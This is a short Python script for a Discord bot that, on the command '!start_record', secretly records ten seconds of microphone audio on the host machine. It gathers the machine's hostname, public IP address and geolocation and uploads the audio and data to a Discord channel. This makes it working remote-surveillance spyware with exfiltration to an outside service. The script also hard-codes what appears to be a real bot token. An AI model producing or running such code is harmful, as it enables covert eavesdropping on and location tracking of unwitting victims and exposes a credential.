import discord
from discord.ext import commands
import pyaudio
import wave
import os
import socket
import requests
import asyncio
from io import BytesIO

# Set up the bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Function to get the IP address, geolocation, and hostname (PC name)
def get_system_info():
    # Get the PC's hostname
    hostname = socket.gethostname()

    # Get the public IP address using ipinfo.io
    ip_response = requests.get("https://ipinfo.io")
    ip_data = ip_response.json()
    ip_address = ip_data.get('ip', 'Unknown IP')
    location = ip_data.get('city', 'Unknown City') + ", " + ip_data.get('region', 'Unknown Region') + ", " + ip_data.get('country', 'Unknown Country')

    return hostname, ip_address, location

# Function to record audio
def record_audio(duration=10, filename="recorded_audio.wav"):
    # Set up the audio stream
    p = pyaudio.PyAudio()
    rate = 44100  # Sample rate
    channels = 2  # Stereo
    frames_per_buffer = 1024

    # Open the audio stream
    stream = p.open(format=pyaudio.paInt16,
                    channels=channels,
                    rate=rate,
                    input=True,
                    frames_per_buffer=frames_per_buffer)
    
    print("Recording...")

    frames = []
    for _ in range(0, int(rate / frames_per_buffer * duration)):
        data = stream.read(frames_per_buffer)
        frames.append(data)

    print("Recording finished.")

    # Stop and close the stream
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save the recorded audio to a WAV file
    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))

# Command to start recording and get system info
@bot.command(name='start_record')
async def start_record(ctx):
    await ctx.send("Starting recording for 10 seconds...")
    
    # Record the audio for 10 seconds
    filename = "recorded_audio.wav"
    record_audio(duration=10, filename=filename)

    # Get system information
    hostname, ip_address, location = get_system_info()

    # Send the system info and the audio file to the Discord server
    info_message = f"**System Information**\n" \
                   f"Hostname: {hostname}\n" \
                   f"IP Address: {ip_address}\n" \
                   f"Location: {location}"
    
    await ctx.send(info_message)
    await ctx.send("Recording complete. Sending audio...", file=discord.File(filename))

    # Clean up the saved file after sending
    os.remove(filename)

# Run the bot
bot.run('MTI3NTQ3NjIwMjgwNjU3NTIzNw.GMSKsE.PLdRXSTVISc8Ttp80UPayMMcD0fjank9Kqc2jU')
